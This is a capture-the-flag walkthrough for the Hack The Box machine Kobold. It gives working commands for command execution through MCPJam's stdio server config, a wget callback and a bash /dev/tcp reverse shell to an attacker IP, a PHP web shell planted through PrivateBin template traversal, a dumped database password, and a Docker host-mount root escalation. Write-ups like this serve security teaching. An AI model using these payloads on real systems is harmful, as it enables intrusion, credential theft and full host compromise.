# Hack The Box - Kobold

## Summary

Kobold is a Linux machine exposing several web applications, including Arcane, MCPJam Inspector, and PrivateBin. The attack path involved abusing MCPJam's ability to start arbitrary `stdio` MCP server commands to obtain command execution as `ben`.

Local enumeration showed that the user could switch into the `docker` group using `sg docker`. Docker access was then abused by mounting the host filesystem inside a container, allowing direct access to `/root/root.txt`.

The final attack chain was:

```text
vhost enumeration → MCPJam Inspector discovery → MCP stdio command execution → shell as ben → sg docker → mount host filesystem → read root flag
```

---

## Target

```text
Machine: Kobold
OS: Linux
Target IP: 10.129.245.50
Main Hostname: kobold.htb
Additional VHosts:
- mcp.kobold.htb
- bin.kobold.htb
```

---

## 1. Host Configuration

The target hostnames were added to `/etc/hosts`:

```bash
echo "10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

Verification:

```bash
grep -i kobold /etc/hosts
```

Expected result:

```text
10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb
```

---

## 2. Web Enumeration

Initial web enumeration identified multiple web applications:

```text
kobold.htb:3552       Arcane v1.13.0
mcp.kobold.htb        MCPJam Inspector
bin.kobold.htb        PrivateBin 2.0.2
```

The MCPJam application was accessible over HTTPS:

```bash
curl -k -i https://mcp.kobold.htb/
```

The response showed the MCPJam Inspector frontend:

```html
<title>MCPJam Inspector</title>
<script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
```

The JavaScript assets were downloaded and searched for API routes:

```bash
mkdir -p enum/web/mcp-js

curl -k -s https://mcp.kobold.htb/ -o enum/web/mcp-index.html

grep -Eo 'src="[^"]+\.js[^"]*' enum/web/mcp-index.html \
  | cut -d'"' -f2 \
  | sort -u \
  | while read js; do
      curl -k -s "https://mcp.kobold.htb$js" -o "enum/web/mcp-js/$(basename "$js")"
    done

grep -RhoE '/api/mcp/[A-Za-z0-9_./-]+' enum/web/mcp-js/ | sort -u
```

Interesting MCP API routes included:

```text
/api/mcp/connect
/api/mcp/servers
/api/mcp/tools/list
/api/mcp/tools/execute
```

---

## 3. Foothold - MCPJam Stdio Command Execution

The `/api/mcp/connect` endpoint accepted a user-controlled `serverConfig`. By using the `stdio` transport with a custom command, the server attempted to run the supplied command.

A callback test was first used to confirm command execution.

On Kali, an HTTP server was started:

```bash
python3 -m http.server 8000
```

On the target interaction side, the following JSON payload was created:

```bash
cat > /tmp/mcp-wget-callback.json << 'EOF'
{
  "serverId": "cb-wget-1",
  "serverConfig": {
    "name": "cb-wget-1",
    "transport": "stdio",
    "command": "bash",
    "args": [
      "-c",
      "wget -qO- http://10.10.15.59:8000/wget_exec_$(id | base64 -w0)"
    ]
  }
}
EOF
```

The payload was sent to MCPJam:

```bash
curl -k -i -s \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/mcp-wget-callback.json \
  https://mcp.kobold.htb/api/mcp/connect
```

The HTTP server on Kali received a callback:

```text
GET /wget_exec_dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg==
```

The base64 value decoded to:

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

This confirmed command execution as `ben`.

---

## 4. Reverse Shell

A reverse shell payload was sent through the same MCPJam `stdio` execution primitive.

On Kali, a listener was started:

```bash
nc -lvnp 4444
```

The MCPJam payload executed a Bash reverse shell:

```bash
cat > /tmp/mcp-revshell.json << 'EOF'
{
  "serverId": "rev1",
  "serverConfig": {
    "name": "rev1",
    "transport": "stdio",
    "command": "bash",
    "args": [
      "-c",
      "bash -c 'bash -i >& /dev/tcp/10.10.15.59/4444 0>&1'"
    ]
  }
}
EOF

curl -k -i -s \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/mcp-revshell.json \
  https://mcp.kobold.htb/api/mcp/connect
```

A shell was received:

```text
connect to [10.10.15.59] from (UNKNOWN) [10.129.245.50]
bash: cannot set terminal process group
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

The shell was upgraded:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

Then on Kali:

```bash
stty raw -echo; fg
```

Basic checks confirmed access as `ben`:

```bash
whoami
id
hostname
pwd
uname -a
cat /etc/os-release
```

Output:

```text
ben
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
kobold.htb
/usr/local/lib/node_modules/@mcpjam/inspector
Ubuntu 24.04.4 LTS
```

The user flag was retrieved:

```bash
cat /home/ben/user.txt
```

---

## 5. Local Enumeration

Local users were checked:

```bash
awk -F: '$3 >= 1000 && $7 !~ /(nologin|false)$/ {print $1 ":" $3 ":" $6 ":" $7}' /etc/passwd
```

Output:

```text
ben:1001:/home/ben:/bin/bash
alice:1002:/home/alice:/bin/bash
```

The active groups for `ben` initially showed:

```bash
id
```

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The `operator` group allowed access to PrivateBin-related files:

```bash
find / -group operator -ls 2>/dev/null
```

Interesting paths included:

```text
/privatebin-data
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/salt.php
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/traffic_limiter.php
```

PrivateBin was running in Docker, and the Docker daemon was running on the host:

```bash
ps auxww | grep -Ei 'docker|containerd|privatebin|arcane'
```

Relevant processes:

```text
root        /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        /usr/bin/containerd
nobody      php-fpm: master process
nobody      nginx: master process
```

At this stage, Docker looked important, but `ben` did not appear to have Docker access through the default group context.

---

## 6. PrivateBin Template Traversal - Additional Finding

PrivateBin version `2.0.2` was identified from frontend assets:

```text
js/privatebin.js?2.0.2
css/bootstrap5/privatebin.css?2.0.2
```

The PrivateBin config later confirmed that template selection was enabled:

```ini
templateselection = true
```

Because `ben` could write into `/privatebin-data/data`, a PHP payload was placed in a PrivateBin data file and included through template traversal.

A proof payload was appended to `salt.php`:

```bash
cp /privatebin-data/data/salt.php /tmp/salt.php.orig

cat >> /privatebin-data/data/salt.php <<'EOF'

file_put_contents(__DIR__ . "/lfi_exec_proof.txt", shell_exec("id; pwd; uname -a"));
EOF
```

The payload was triggered with the `template` cookie:

```bash
curl -k -s -b "template=../data/salt" https://bin.kobold.htb/ >/dev/null
```

The proof file was created:

```bash
cat /privatebin-data/data/lfi_exec_proof.txt
```

Output:

```text
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
/var/www
Linux 4c49dd7bb727 6.8.0-106-generic ...
```

This confirmed code execution inside the PrivateBin container as `nobody`.

A simple command runner was created:

```bash
cat > /privatebin-data/data/cmd.php <<'EOF'
<?php
$out = __DIR__ . "/cmd_out.txt";
$cmd = $_GET["x"] ?? "id";
file_put_contents($out, "===== CMD: $cmd =====\n");
file_put_contents($out, shell_exec($cmd . " 2>&1"));
?>
EOF
```

Helper function:

```bash
runpb() {
  CMD="$1"
  curl -k -s -b "template=../data/cmd" \
    "https://bin.kobold.htb/?x=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$CMD")" >/dev/null
  echo "===== $CMD ====="
  cat /privatebin-data/data/cmd_out.txt
  echo
}
```

The PrivateBin configuration was copied out:

```bash
runpb 'cp /srv/cfg/conf.php /srv/data/conf_dump.php && chmod 644 /srv/data/conf_dump.php'
cat /privatebin-data/data/conf_dump.php
```

The config contained a database credential:

```ini
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

This credential did not work for SSH, `su`, `sudo`, Arcane authentication, or MySQL access. It was an interesting finding, but it was not required for root access.

---

## 7. Privilege Escalation - Docker Group via sg

The important local privilege escalation issue was Docker access.

Although `id` did not initially show `docker`, switching group context with `sg docker` worked:

```bash
sg docker -c 'id; docker images'
```

Output:

```text
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   3 months ago   922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   7 months ago   122MB
```

This confirmed that `ben` could access Docker by switching into the `docker` group.

Docker group membership is root-equivalent because containers can be started with the host filesystem mounted.

The first attempt failed because the image tag was omitted:

```bash
sg docker -c 'docker run --rm -v /:/hostfs -w /hostfs privatebin/nginx-fpm-alpine cat /hostfs/root/root.txt'
```

Docker tried to pull:

```text
privatebin/nginx-fpm-alpine:latest
```

However, the available local image was:

```text
privatebin/nginx-fpm-alpine:2.0.2
```

The correct command used the local tag:

```bash
sg docker -c 'docker run --rm -v /:/hostfs privatebin/nginx-fpm-alpine:2.0.2 cat /hostfs/root/root.txt'
```

Alternative using the local MySQL image:

```bash
sg docker -c 'docker run --rm -v /:/hostfs mysql:latest cat /hostfs/root/root.txt'
```

For an interactive root shell on the host filesystem:

```bash
sg docker -c 'docker run --rm -it -v /:/hostfs -w /hostfs privatebin/nginx-fpm-alpine:2.0.2 chroot /hostfs /bin/bash'
```

For a non-interactive proof:

```bash
sg docker -c 'docker run --rm -v /:/hostfs -w /hostfs privatebin/nginx-fpm-alpine:2.0.2 chroot /hostfs /bin/bash -c "id; cat /root/root.txt"'
```

---

## 8. Root Flag

The root flag was read by mounting the host filesystem inside a Docker container:

```bash
sg docker -c 'docker run --rm -v /:/hostfs privatebin/nginx-fpm-alpine:2.0.2 cat /hostfs/root/root.txt'
```

This provided access to:

```text
/hostfs/root/root.txt
```

---

## Attack Chain

```text
1. Added kobold.htb, mcp.kobold.htb, and bin.kobold.htb to /etc/hosts.
2. Enumerated web services and discovered MCPJam Inspector.
3. Extracted MCPJam API routes from frontend JavaScript.
4. Identified /api/mcp/connect as accepting user-controlled stdio server configuration.
5. Used stdio command execution to confirm RCE as ben.
6. Sent a Bash reverse shell payload through MCPJam.
7. Received a shell as ben.
8. Retrieved user.txt from /home/ben.
9. Enumerated local users, groups, services, and Docker-related processes.
10. Investigated PrivateBin and confirmed template traversal to PHP execution inside the container.
11. Retrieved PrivateBin configuration and discovered a database credential.
12. Re-focused on Docker and tested group switching with sg docker.
13. Confirmed Docker access with docker images.
14. Mounted the host filesystem inside a Docker container.
15. Read /root/root.txt through the mounted host filesystem.
```
